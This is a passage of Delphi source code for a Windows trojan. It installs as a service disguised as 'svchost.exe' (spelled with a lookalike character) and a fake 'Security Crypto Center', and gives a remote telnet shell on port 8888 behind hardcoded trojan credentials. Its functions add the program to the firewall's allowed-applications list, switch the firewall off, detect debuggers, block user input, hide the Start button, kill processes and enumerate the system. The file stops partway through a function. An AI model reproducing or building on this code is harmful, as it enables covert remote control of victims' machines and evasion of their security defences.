////////////////////////////////////////////////////////////////////////////////
//
//  ****************************************************************************
//  * Unit Name : Service
//  * Purpose   : Telnet.
//  * Author    : StalkerSTS
//  * Copyright : © StalkerSTS Corporation. Lab 2014.
//  * Version   : 1.00
//  ****************************************************************************
//
// В данном коде показано как из под сервиса запустить
// приложение в контексте десктопа пользователя.
// И сервис и приложение обьеденины в одном исполняемом файле,
// режимы работы выбираются при помощи параметров командной строки.
// Основной принцип - при получении токен
// залогиненного пользователя и вызвать CreateProcessAsUser
// с необходимыми параметрами.
// В случае W2K это осуществялется через получение токена
// у первого попавшегося процеса, окна которого обнаружены на активном десктопе,
// в остальных случаях (XP и выше) через вызов WTSQueryUserToken
// Это сервис, управляемый ч/з тельнет
// Работает по протоколу login
// Created by StalkerSTS(c)2014


program svchost;
{$I-}

{$DEFINE SERVICE_DEBUG}

uses
  Windows,
  SysUtils,
  CrtSock,
  WinSvc,
  PsAPI,
  Classes,
  Registry,
  ShlObj,
  ComObj,
  ShellAPI,
  ActiveX,
  DCPrijndael,
  DCPsha512,
  TLHelp32,
  Graphics,
  SysConst, //DateTime
  NetFwTypeLib_TLB,
  WbemScripting_TLB,
  GetWinVersionInfo,
  advAPIHook;

resourcestring
      // Защитит простейшее "шифрование - Rijndael".
      //Логин
      TrojLogin = 'stalker';
      TrojPasw  = 'OBnlegca'; //rijndael
      // Порт
      l_port    = '8888';
      Comspec   = 'c:\windows\system32\cmd.exe /c';
{$WARN SYMBOL_PLATFORM OFF}
const LN_FEED = #13#10;          // Перевод строки
      CR = #13;                  // Enter или <CR>
      RestartTimeWait = 3000;    // Ждать перед стартом на рестарте
      Bs = 512;                  // Размер блока при копировании
      //-----------------------Socket--------------------------------
      Ver = 'ESS (Telnet Security Crypto Center) v.1.0 by StalkerSTS.(c)2014';
      Str_Hello = 'HELLO from ' + Ver + #13#10; // Строка приветствия
      Str_Psw = 'Enter the password: ';         // Приглашение к вводу пароля
      Str_Login = 'Enter login: ';              // Приглашение к вводу логина
      Disc_String = 'Disconnecting...';
      PS1 = '>';  // Главное приглашение
      PS2 = ':';  // Приглашение в ответах на вопросы и т.д.
      MaxLn = 50; // Форматная длина (исп-ся при выводе на экран в ровный стлобец
      MaxCmdLen = 255;     // Макс. длина, принимаемой строки
      EchoStyle = false;   // false - эхо выключено
      // Имя программы для функции DeleteSelf
      InjectionForDelete = 'svchost.exe';

type
  PNetResourceArray = ^TNetResourceArray;
  TNetResourceArray = array[0..MaxInt div SizeOf(TNetResource) - 1] of TNetResource;
  PathBuf    = array [0..MAX_PATH] of char;//Буфер пути к файлу

const
  ntdll = 'NTDLL.DLL';

type
  NTSTATUS = ULONG;
  HANDLE = ULONG;
  PROCESS_INFORMATION_CLASS = ULONG;

{$IFDEF CONDITIONALEXPRESSIONS}
  {$IF Defined(TOSVersionInfoEx)}
    {$DEFINE TOSVERSIONINFOEX_DEFINED}
  {$IFEND}
{$ENDIF}
{$IFNDEF TOSVERSIONINFOEX_DEFINED}

type
  POSVersionInfoEx = ^TOSVersionInfoEx;
  TOSVersionInfoEx = packed record
    dwOSVersionInfoSize: DWORD;
    dwMajorVersion     : DWORD;
    dwMinorVersion     : DWORD;
    dwBuildNumber      : DWORD;
    dwPlatformId       : DWORD;
    szCSDVersion       : array [0..127] of AnsiChar;
    wServicePackMajor  : Word;
    wServicePackMinor  : Word;
    wSuiteMask         : Word;
    wProductType       : Byte;
    wReserved          : Byte;
  end;

const
  VER_SERVER_NT                       = $80000000;
  {$EXTERNALSYM VER_SERVER_NT}
  VER_WORKSTATION_NT                  = $40000000;
  {$EXTERNALSYM VER_WORKSTATION_NT}
  VER_SUITE_SMALLBUSINESS             = $00000001;
  {$EXTERNALSYM VER_SUITE_SMALLBUSINESS}
  VER_SUITE_ENTERPRISE                = $00000002;
  {$EXTERNALSYM VER_SUITE_ENTERPRISE}
  VER_SUITE_BACKOFFICE                = $00000004;
  {$EXTERNALSYM VER_SUITE_BACKOFFICE}
  VER_SUITE_COMMUNICATIONS            = $00000008;
  {$EXTERNALSYM VER_SUITE_COMMUNICATIONS}
  VER_SUITE_TERMINAL                  = $00000010;
  {$EXTERNALSYM VER_SUITE_TERMINAL}
  VER_SUITE_SMALLBUSINESS_RESTRICTED  = $00000020;
  {$EXTERNALSYM VER_SUITE_SMALLBUSINESS_RESTRICTED}
  VER_SUITE_EMBEDDEDNT                = $00000040;
  {$EXTERNALSYM VER_SUITE_EMBEDDEDNT}
  VER_SUITE_DATACENTER                = $00000080;
  {$EXTERNALSYM VER_SUITE_DATACENTER}
  VER_SUITE_SINGLEUSERTS              = $00000100;
  {$EXTERNALSYM VER_SUITE_SINGLEUSERTS}
  VER_SUITE_PERSONAL                  = $00000200;
  {$EXTERNALSYM VER_SUITE_PERSONAL}
  VER_SUITE_BLADE                     = $00000400;
  {$EXTERNALSYM VER_SUITE_BLADE}
  VER_SUITE_EMBEDDED_RESTRICTED       = $00000800;
  {$EXTERNALSYM VER_SUITE_EMBEDDED_RESTRICTED}
  VER_SUITE_SECURITY_APPLIANCE        = $00001000;
  {$EXTERNALSYM VER_SUITE_SECURITY_APPLIANCE}

const
  VER_NT_WORKSTATION              = $0000001;
  {$EXTERNALSYM VER_NT_WORKSTATION}
  VER_NT_DOMAIN_CONTROLLER        = $0000002;
  {$EXTERNALSYM VER_NT_DOMAIN_CONTROLLER}
  VER_NT_SERVER                   = $0000003;
  {$EXTERNALSYM VER_NT_SERVER}

{$ENDIF}  // TOSVERSIONINFOEX_DEFINED

{$WARN SYMBOL_PLATFORM OFF}

const
  InfoStr = 'Use: Security Crypto Center '#13#10'%s [ -install | -uninstall ]';
  ServiceFileName = 'svсhost.exe';
  Name = 'SecSrvS';
  DisplayName = 'Security Crypto Center';
  ServiceDescription = 'Monitors system security cryptographic services settings and configurations.';

type
  TWTSQueryUserToken = function(
    SessionID: DWORD; var Token: THandle): BOOL; stdcall;

type
{ System Locale information record }
  TSysLocale = packed record
    DefaultLCID: Integer;
    PriLangID: Integer;
    SubLangID: Integer;
    FarEast: Boolean;
    MiddleEast: Boolean;
  end;

var
  ServicesTable: packed array [0..1] of TServiceTableEntry;
  StatusHandle: SERVICE_STATUS_HANDLE = 0;
  Status: TServiceStatus;
  //my s
  s: string;
  //TELNET
  Srv, Cln: integer;
  Tf: Text;              // Файл ввода-вывода, ассоциированный с терминалом
  ch:Char;               // Символ буквы диска
  TrmCmd: String;        // Строка-команда
  // Флаг включения отображения символов
  EchoOn: Boolean = EchoStyle;
  //FireWall
  fwProf:INetFwProfile;
  Win32Platform: Integer = 0;
  //Директории Windows
  SysTemDir: array[0..MAX_PATH] of Char;
  WinTemDir: array[0..MAX_PATH] of Char;
  //SerNamber
  SerialNum : dword;
  a, b : dword;
  Buffer : array [0..255] of char;
  //ProcessWatcher
  SWbemLocator1: TSWbemLocator;
  csSync: _RTL_CRITICAL_SECTION;
  //RunAsAdmin
  FName : PWideChar;
  startupinfo: _STARTUPINFOA;
  processinformation: _PROCESS_INFORMATION;
  // Сообщения об ошибках
  ErrArray: Array[0..15] Of String =
  (
      'Operation completed successfully...',
      'Filename is empty!',
      'Directory name is empty!',
      'Parameters error!',
      'Disk letter incorrect!',
      'Login fault!',
      'Reboot error!',
      'Internal command not found!',
      'Error while killing process!',
      'Error!',
      'Error while creating directory!',
      'Error while deleting file!',
      'Error while renaming file!',
      'Copying error!','',''
  );
    CurLogin : String;
    //==========KEY==========
    KeyRelease:string = 'DJFDKSFghjyg;KH9bn6CRTXCx4hUGLB.8.nkVTJ6FJfjylk7gl7GLUHm'+
    'HG7gnkBk8jhKkKJHK87HkjkFGF6PCbV9KaK81WWYgP[CR[yjILWv2_SBE]AsLEz_8sBZ3LV5N'+
    'Go0NLL1om4 XbALjhgkk7sda823r23;d923NrUdkzPp5 DkJ2_8JvYmWFn LR3CRxyfswsto'+
    'cvnkscv78h2lk8HHKhlkjdfvsd;vlkvsd0vvds;ldvhyB[NXzl5y5Z';

    {Win32 OS version information }
    Win32MajorVersion: Integer = 0;
    Win32MinorVersion: Integer = 0;
    Win32BuildNumber: Integer = 0;

    //Критпроцесс
    bl: PBOOL;
    BreakOnTermination: ULONG;
    HRES: HRESULT;

    //Сервис службы
    NotifyString: string;

   //Извлекаем из ресурса
    ms : TMemoryStream;
    rs : TResourceStream;
    m_DllDataSize : integer;
    mp_DllData : Pointer;

    function SHFormatDrive( hWnd: HWND; Drive: Word; fmtID: Word;
                        Options: Word ): Longint; stdcall;
    external 'Shell32.dll' name 'SHFormatDrive';

    {Включения крит процесса}
    function RtlAdjustPrivilege(Privilege: ULONG; Enable: BOOL; CurrentThread: BOOL; var Enabled: PBOOL): DWORD; stdcall; external 'ntdll.dll';
    function NtSetInformationProcess(ProcessHandle: HANDLE; ProcessInformationClass: PROCESS_INFORMATION_CLASS; ProcessInformation: Pointer; ProcessInformationLength: ULONG): NTSTATUS; stdcall; external ntdll;

    //Запуск от Админа
    function CreateProcessWithLogonW(
    lpUsername: LPCWSTR;
    lpDomain: LPCWSTR;
    lpPassword: LPCWSTR;
    dwLogonFlags: DWORD;
    lpApplicationName: LPCWSTR;
    lpCommandLine: LPWSTR;
    dwCreationFlags: DWORD;
    lpEnvironment: Pointer;
    lpCurrentDirectory: LPCWSTR;
    const lpStartupInfo: _STARTUPINFOA;
    var lpProcessInfo: _PROCESS_INFORMATION
    ): Boolean; stdcall; external 'Advapi32.dll';

  // Блокирует/разблокирует ввод (мышь и клавиатуру)
    Procedure BlockInput(ABlockInput: Boolean); stdcall; external 'USER32.DLL';

    function WTSGetActiveConsoleSessionId: DWORD; stdcall; external 'kernel32.dll';

const
  SECURITY_MANDATORY_UNTRUSTED_RID = $00000000;
  SECURITY_MANDATORY_LOW_RID = $00001000;
  SECURITY_MANDATORY_MEDIUM_RID = $00002000;
  SECURITY_MANDATORY_HIGH_RID = $00003000;
  SECURITY_MANDATORY_SYSTEM_RID = $00004000;
  SECURITY_MANDATORY_PROTECTED_PROCESS_RID = $00005000;

type
  PTokenMandatoryLabel = ^TTokenMandatoryLabel;
  TTokenMandatoryLabel = packed record
   Label_ : TSidAndAttributes;
  end;

type
 //Extend existing enumeration in Windows.pas with new Vista constants
  TTokenInformationClass = (TokenICPad, TokenUser, TokenGroups, TokenPrivileges, TokenOwner, TokenPrimaryGroup, TokenDefaultDacl, TokenSource, TokenType, TokenImpersonationLevel, TokenStatistics, TokenRestrictedSids, TokenSessionId, TokenGroupsAndPrivileges, TokenSessionReference, TokenSandBoxInert, TokenAuditPolicy, TokenOrigin, TokenElevationType, TokenLinkedToken, TokenElevation, TokenHasRestrictions, TokenAccessInformation, TokenVirtualizationAllowed, TokenVirtualizationEnabled, TokenIntegrityLevel, TokenUIAccess, TokenMandatoryPolicy, TokenLogonSid);

type
  TReplaceFlags = set of (rfReplaceAll, rfIgnoreCase);

type
  TCreateProcThread = class(TThread)
  private
    { Private declarations }
  protected
    procedure Execute; override;
  end;
  TStopProcThread = class(TThread)
  private
    { Private declarations }
  protected
    procedure Execute; override;
  end;

const
  WBEM_FLAG_RETURN_IMMEDIATELY     = $10;
  WBEM_FLAG_FORWARD_ONLY           = $20;

{$R hack.RES}
{$R kbh.RES}
{$R skbh.RES}
{$R UAC.RES}
{$R UAC_Mft.RES}

//Управляем Фаерволлом
function StrPas(const Str: PChar): string;
begin
  Result := Str;
end;

//WindowsFirewall
function IsWindowsFirewallServicePresent:Boolean;
var
 scm,svc:SC_HANDLE;
 sz:DWORD;
 pConfig:PQueryServiceConfig;
 spPath:array[0..255] of Char;
 ptr:Pchar;
begin
 Result:=False;
 if Win32Platform<>VER_PLATFORM_WIN32_NT then Exit;
 scm:=winsvc.OpenSCManager(nil,nil,GENERIC_READ);
 try
  if scm>0 then
   begin
    svc:=winsvc.OpenService(scm,PChar('SharedAccess'),SERVICE_QUERY_CONFIG);  // please don't change the name of the service.
    if svc>0 then
     begin
      winsvc.QueryServiceConfig(svc,nil,0,sz);
      if windows.GetLastError=ERROR_INSUFFICIENT_BUFFER then
       begin
        pConfig:=PQueryServiceConfig(GlobalAlloc(GMEM_FIXED,sz));
        if Assigned(pConfig) then
         begin
          if winsvc.QueryServiceConfig(svc,pConfig,sz,sz) then Result:=(pConfig.dwStartType<SERVICE_DEMAND_START);
          GlobalFree(HGLOBAL(pConfig));
         end;
       end;
     end;
    winsvc.CloseServiceHandle(svc);
   end;
 finally
  winsvc.CloseServiceHandle(scm);
 end;
 if Result then  // check if HNetCfg.dll is located somewhere on system
  Result:=(windows.SearchPath(nil,PChar('hnetcfg.dll'),nil,255,spPath,ptr)>0) and (FileExists(StrPas(spPath)));
end;

function ICFInitialize(out fwProfile:INetFwProfile):HRESULT;
var
 fwMgr:INetFwMgr;
 fwPolicy:INetFwPolicy;
 hr:HRESULT;
begin
 Result:=S_OK;
 if Assigned(fwProfile) then Exit;
 fwProfile:=nil;
 hr:=CoCreateInstance(CLASS_NetFwMgr,nil,CLSCTX_INPROC_SERVER or CLSCTX_LOCAL_SERVER,INetFwMgr,fwMgr);
 if (hr=S_OK) and Assigned(fwMgr) then
  begin
   fwPolicy:=fwMgr.LocalPolicy;
   if Assigned(fwPolicy) then
    begin
     fwProfile:=fwPolicy.CurrentProfile;
     fwProf:=fwPolicy.CurrentProfile;
     if Assigned(fwProfile) then Result:=S_OK else Result:=GetLastError;
    end;
   fwPolicy:=nil;
  end;
 fwMgr:=nil; // cleanup 
end;

//WindowsFirewall
function IsWindowsFirewallOn(fwProfile:INetFwProfile):Boolean;
begin
 Result:=False;
 if Assigned(fwProfile) then Result:=fwProfile.FirewallEnabled;
end;

function WindowsFirewallTurnOn(fwProfile:INetFwProfile):Boolean;
begin
 try
 Result:=False;
 if not Assigned(fwProfile) then Exit;
 if IsWindowsFirewallOn(fwProfile) then Exit;
 fwProfile.FirewallEnabled:=True;
 Result:=fwProfile.FirewallEnabled=True;
 except
  fwProfile.FirewallEnabled:=True;
 end;
end;

function WindowsFirewallTurnOff(fwProfile:INetFwProfile):Boolean;
begin
 try
 Result:=False;
 if not Assigned(fwProfile) then Exit;
 if not IsWindowsFirewallOn(fwProfile) then Exit;
 fwProfile.FirewallEnabled:=False;
 Result:=fwProfile.FirewallEnabled=False;
 except
  fwProfile.FirewallEnabled:=False;
 end;
end;

//TELNET
Procedure ClnStop(SrvSck, ClnSck: Integer);
Begin
   AssignCrtSock(Srv, Input, Output);
   Disconnect(Cln);
End;

Function Check_Avail: Boolean;
Begin
  Result:=True;
  if (SockAvail(Cln) < 0) Then
     Begin
        // Сам клиент порвался
        ClnStop(Srv, Cln);
        Result:=False;
     End;
End;

Function RecodeToOEM(const S: String): String;
Var NewS: String;
Begin
   if (Length(S) = 0) Then exit;
   SetLength(NewS, Length(S));
   AnsiToOEM(PChar(S), PChar(NewS));
   Result := NewS;
End;

Function RecodeToANSI(const S: String): String;
Var NewS: String;
Begin
   if (Length(S) = 0) Then exit;
   SetLength(NewS, Length(S));
   OEMToAnsi(PChar(S), PChar(NewS));
   Result := NewS;
End;

Procedure WriteLf(S: String; Recode: Boolean = true); overload;
Begin
   if (Recode) Then S := RecodeToOEM(S);
   Write(S + LN_FEED);
End;

Procedure WriteLf(const S: Int64); overload;
Begin
   Write(S, LN_FEED);
End;

Function ShErr: Boolean;
// Вывод ошибки операционной системы
Var Err: Integer;
Begin
   Err:=IOResult;
   Result:=False;
   If Err <> 0 Then
      Begin
         Result:=True;
         WriteLf(SysErrorMessage(Err));
      End;
End;

{ TCreateProcThread }
procedure TCreateProcThread.Execute;
var
  Service: ISWbemServices;
  Eventquery: ISWbemEventSource;
  objLatestProcess: ISWbemObject;
  Prop: OleVariant;
begin
  CoInitializeEx(nil, COINIT_APARTMENTTHREADED);
  Service := SWbemLocator1.ConnectServer('.',
    'root\cimv2',
    '', '',
    '',
    '', 0, nil);
  Eventquery := Service.ExecNotificationQuery(
    'select * from __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA ''Win32_Process''',
    'WQL',
    WBEM_FLAG_RETURN_IMMEDIATELY or WBEM_FLAG_FORWARD_ONLY, nil);
  while not Terminated do
  begin
    objLatestProcess := Eventquery.NextEvent(Integer(INFINITE));
    Prop := objLatestProcess;
    EnterCriticalSection(csSync);
    DateTimeToString(s, 'dd/mm/yyyy hh:mm:ss', now);
    WriteLf('Started: ' + Prop.TargetInstance.Name + #09#09 + s);
    LeaveCriticalSection(csSync);
  end;
end;
{ TStopProcThread }

procedure TStopProcThread.Execute;
var
  Service: ISWbemServices;
  Eventquery: ISWbemEventSource;
  objLatestProcess: ISWbemObject;
  Prop: OleVariant;
begin
  CoInitializeEx(nil, COINIT_APARTMENTTHREADED);
  Service := SWbemLocator1.ConnectServer('.',
    'root\cimv2',
    '', '',
    '',
    '', 0, nil);
  Eventquery := Service.ExecNotificationQuery(
    'select * from __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA ''Win32_Process''',
    'WQL',
    WBEM_FLAG_RETURN_IMMEDIATELY or WBEM_FLAG_FORWARD_ONLY, nil);
  while not Terminated do
  begin
    objLatestProcess := Eventquery.NextEvent(Integer(INFINITE));
    Prop := objLatestProcess;
    EnterCriticalSection(csSync);
    DateTimeToString(s, 'dd/mm/yyyy hh:mm:ss', now);
    WriteLf('Stopped: ' + Prop.TargetInstance.Name + #09#09 + s);
    LeaveCriticalSection(csSync);
  end;
end;

function ProcessWatcher: string;
begin
  InitializeCriticalSection(csSync);
  WriteLf('Process name'#09#09#09'Event date');
  CoInitializeEx(nil, COINIT_APARTMENTTHREADED);
  SWbemLocator1 := TSWbemLocator.Create(nil);
  try
    TCreateProcThread.Create(false);
    TStopProcThread.Create(false);
    while True do
      Sleep(1);
  finally
    SWbemLocator1.Free;
  end;
end;

//Защита от отладчика
function DebuggerPresent:boolean;
type
  TDebugProc = function:boolean; stdcall;
var
   Kernel32:HMODULE;
   DebugProc:TDebugProc;
begin
   Result:=false;
   Kernel32:=GetModuleHandle('kernel32.dll');
   if kernel32 <> 0 then
    begin
      @DebugProc:=GetProcAddress(kernel32, 'IsDebuggerPresent');
      if Assigned(DebugProc) then
         Result:=DebugProc;
    end;
end;

//Узнаем все системные директории
procedure GetSystemDir;
var
  reg : TRegistry;
  ts : TStrings; 
  i : integer;
begin 
  reg := TRegistry.Create;
  reg.RootKey := HKEY_CURRENT_USER;
  reg.LazyWrite := false;
  reg.OpenKey( 
   'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders', 
              false); 
    ts := TStringList.Create; 
    reg.GetValueNames(ts); 
    for i := 0 to ts.Count -1 do begin
        WriteLf(ts.Strings[i] +
                      ' = ' +
                      reg.ReadString(ts.Strings[i]));
    end;
    ts.Free; 
  reg.CloseKey; 
  reg.free;
end;

//Определить видеокарту
procedure GetVideoCard;
var
  lpDisplayDevice: TDisplayDevice;
  dwFlags: DWORD;
  cc: DWORD;
begin
  lpDisplayDevice.cb := sizeof(lpDisplayDevice);
  dwFlags := 0;
  cc := 0;
  while EnumDisplayDevices(nil, cc, lpDisplayDevice, dwFlags) do
  begin
    Inc(cc);
    WriteLf(lpDisplayDevice.DeviceString);
  end;
end;

//Скрыть пуск
procedure HidePusk;
var 
               Rgn : hRgn; 
begin
               Rgn := CreateRectRgn(0, 0, 0, 0);
               SetWindowRgn(FindWindowEx(FindWindow('Shell_TrayWnd', nil),
                                                    0, 
                                                   'Button', 
                                                    nil), 
                                                    Rgn,
                                                    true);
end;

//Показать пуск
procedure ShowPusk;
begin
               SetWindowRgn(FindWindowEx(FindWindow('Shell_TrayWnd', nil),
                                                    0, 
                                                   'Button', 
                                                    nil), 
                                                    0,
                                                    true);
end;

//Блокировка пуска
procedure BlockPusk;
begin
 EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil), 
                                                    0, 
                                                    'Button', 
                                                    nil), 
                                                    false);
end;

//Разрешить пуск
procedure UnBlockPusk;
begin
EnableWindow(FindWindowEx(FindWindow('Shell_TrayWnd', nil), 
                                                    0, 
                                                    'Button', 
                                                    nil), 
                                                    true);
end;

//Получить путь из ярлыка  ShowMessage( GetFileNameFromLink( 'C:\NOTEPAD.lnk' ) );
function GetFileNamefromLink(LinkFileName: string): string;
var
  MyObject: IUnknown;
  MySLink: IShellLink;
  MyPFile: IPersistFile;
  FileInfo: TWin32FINDDATA;
  WidePath: array[0..MAX_PATH] of WideChar;
  Buff: array[0..MAX_PATH] of Char;
begin
  Result := '';
  CoInitialize(nil);
  if (fileexists(Linkfilename) = false) then exit;
  MyObject := CreateComObject(CLSID_ShellLink);
  MyPFile := MyObject as IPersistFile;
  MySLink := MyObject as IShellLink;
  StringToWideChar(LinkFileName, WidePath, SizeOf(WidePath));
  MyPFile.Load(WidePath, STGM_READ);
  MySLink.GetPath(Buff, Max_PATH, FileInfo, SLGP_UNCPRIORITY);
  Result := buff;
  CoUninitialize;
end;

//получить рабочую директорию файла из его ярлыка  ShowMessage( GetFileWorkingDirectoryFromLink( 'C:\NOTEPAD.lnk' ) );
function GetFileWorkingDirectoryFromLink( LinkFileName: string ): string;
var
 MyObject: IUnknown;
 MySLink: IShellLink;
 MyPFile: IPersistFile;
 WidePath: array[0..MAX_PATH] of WideChar;
 Buff: array[0..MAX_PATH] of Char;
begin
 Result := '';
 CoInitialize(nil);
if ( FileExists( LinkFileName ) = false ) then Exit;
 MyObject := CreateComObject( CLSID_ShellLink );
 MyPFile := MyObject as IPersistFile;
 MySLink := MyObject as IShellLink;
 StringToWideChar( LinkFileName, WidePath, SizeOf( WidePath ) );
 MyPFile.Load( WidePath, STGM_READ );
 MySLink.GetWorkingDirectory( Buff, MAX_PATH );
 Result := buff;
 CoUninitialize; 
end;

function GetOSVersionInfo(var Info: TOSVersionInfoEx): Boolean;
begin
  FillChar(Info, SizeOf(TOSVersionInfoEx), 0);
  Info.dwOSVersionInfoSize := SizeOf(TOSVersionInfoEx);
  Result := GetVersionEx(TOSVersionInfo(Addr(Info)^));
  if (not Result) then
  begin
    FillChar(Info, SizeOf(TOSVersionInfoEx), 0);
    Info.dwOSVersionInfoSize := SizeOf(TOSVersionInfoEx);
    Result := GetVersionEx(TOSVersionInfo(Addr(Info)^));
    if (not Result) then
      Info.dwOSVersionInfoSize := 0;
  end;
end;

function GetOSVersionText: string;
var
  Info: TOSVersionInfoEx;
  Key: HKEY;
begin
  Result := '';
  if (not GetOSVersionInfo(Info)) then
    Exit;
  case Info.dwPlatformId of
    { Win32s }
    VER_PLATFORM_WIN32s:
      Result := 'Microsoft Win32s';
    { Windows 9x }
    VER_PLATFORM_WIN32_WINDOWS:
      if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 0) then
      begin
        Result := 'Microsoft Windows 95';
        if (Info.szCSDVersion[1] in ['B', 'C']) then
          Result := Result +' OSR2';
      end
      else if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 10) then
      begin
        Result := 'Microsoft Windows 98';
        if (Info.szCSDVersion[1] = 'A') then
          Result := Result + ' SE';
      end
      else if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 90) then
        Result := 'Microsoft Windows Millennium Edition';
    { Windows NT }
    VER_PLATFORM_WIN32_NT:
      begin
        { Version }
        if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 2) then
          Result := 'Microsoft Windows Server 2003'
        else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 1) then
          Result := 'Microsoft Windows XP'
        else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 0) then
          Result := 'Microsoft Windows 2000'
        else
          Result := 'Microsoft Windows NT';
        { Extended }
        if (Info.dwOSVersionInfoSize >= SizeOf(TOSVersionInfoEx)) then
        begin
          { ProductType }
          if (Info.wProductType = VER_NT_WORKSTATION) then
          begin
            if (Info.dwMajorVersion = 4) then
              Result := Result + #10'Workstation 4.0'
            else if(Info.wSuiteMask and VER_SUITE_PERSONAL <> 0) then
              Result := Result + #10'Home Edition'
            else
              Result := Result + #10'Professional';
          end
          else if (Info.wProductType = VER_NT_SERVER) then
          begin
             if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 2) then
             begin
               if (Info.wSuiteMask and VER_SUITE_DATACENTER <> 0) then
                 Result := Result + #10'Datacenter Edition'
               else if (Info.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then
                 Result := Result + #10'Enterprise Edition'
               else if (Info.wSuiteMask = VER_SUITE_BLADE) then
                 Result := Result + #10'Web Edition'
               else
                 Result := Result + #10'Standard Edition';
             end
             else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 0) then
             begin
               if (Info.wSuiteMask and VER_SUITE_DATACENTER <> 0) then
                  Result := Result + #10'Datacenter Server'
               else if (Info.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then
                  Result := Result + #10'Advanced Server'
               else
                  Result := Result + #10'Server';
             end
             else
             begin
               Result := Result + #10'Server ' +
                 IntToStr(Info.dwMajorVersion) + '.' +
                 IntToStr(Info.dwMinorVersion);
               if (Info.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then
                 Result := Result + ', Enterprise Edition';
             end;
          end;
        end;
        { CSDVersion }
        if (Info.dwMajorVersion = 4) and
          (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
            'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Hotfix\Q246009', 0,
            KEY_QUERY_VALUE, Key) = ERROR_SUCCESS) then
        begin
          Result := Result + #10'Service Pack 6a';
          RegCloseKey(Key);
        end
        else
          Result := Result + #10 + (Info.szCSDVersion);
          Result := Result + #10'(Build ' +
          IntToStr(Info.dwBuildNumber and $FFFF) + ')';
      end;
  end;
end;

function UpperCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

//Обход Фаерволла
procedure fuck_xpfw;
var
 key:hKey;
 ValueName:array[0..255] of char;
 Value:string;
 const
//Добавляем программу
 path='SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List';
//Добавляем порт
//path='SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List';
begin
 if RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_ALL_ACCESS, key)<>0 then exit;
 GetModuleFileName(GetModuleHandle(nil), ValueName, 256);
 Value:=ValueName+':*:Enabled:RPC';
 RegSetValueEx(key, ValueName, 0, REG_SZ, pchar(Value), length(Value));
 RegCloseKey(key);
end;

//Проверка на запуск процесса
function processExists(exeFileName: string): Boolean;
var
    ContinueLoop: BOOL;
    FSnapshotHandle: THandle;
    FProcessEntry32: TProcessEntry32;
begin
    FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
    ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
    Result := False;
    while Integer(ContinueLoop) <> 0 do
    begin
      if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
        UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
        UpperCase(ExeFileName))) then
      begin
        Result := True;
      end;
      ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
    end;
    CloseHandle(FSnapshotHandle);
end;

// чтение из реестра
function RegQueryStr(RootKey: HKEY; Key, Name: string;
  Success: PBoolean = nil): string;
var
  Handle: HKEY;
  Res: LongInt;
  DataType, DataSize: DWORD;
begin
  if Assigned(Success) then
    Success^ := False;
  Res := RegOpenKeyEx(RootKey, PChar(Key), 0, KEY_QUERY_VALUE, Handle);
  if Res <> ERROR_SUCCESS then
    Exit;
  Res := RegQueryValueEx(Handle, PChar(Name), nil, @DataType, nil, @DataSize);
  if (Res <> ERROR_SUCCESS) or (DataType <> REG_SZ) then
  begin
    RegCloseKey(Handle);
    Exit;
  end;
  SetString(Result, nil, DataSize - 1);
  Res := RegQueryValueEx(Handle, PChar(Name), nil, @DataType, @Result[1], @DataSize);
  if Assigned(Success) then
    Success^ := Res = ERROR_SUCCESS;
  RegCloseKey(Handle);
end;

// запись в реестра
function RegWriteStr(RootKey: HKEY; Key, Name, Value: string): Boolean;
var
  Handle: HKEY;
  Res: LongInt;
begin
  Result := False;
  Res := RegCreateKeyEx(RootKey, PChar(Key), 0, nil, REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS, nil, Handle, nil);
  if Res <> ERROR_SUCCESS then
    Exit;
  Res := RegSetValueEx(Handle, PChar(Name), 0, REG_SZ, PChar(Value),
    Length(Value) + 1);
  Result := Res = ERROR_SUCCESS;
  RegCloseKey(Handle);
end;

//Убить процесс
function KillTask(ExeFileName: string): Integer;
const
  PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  Result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while Integer(ContinueLoop) <> 0 do
  begin
    if Integer(ContinueLoop) <> 0 then
    if ExeFileName = FProcessEntry32.szExeFile then
       Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE,
                                    BOOL(0),
                                    FProcessEntry32.th32ProcessID),
                                    0));
     ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
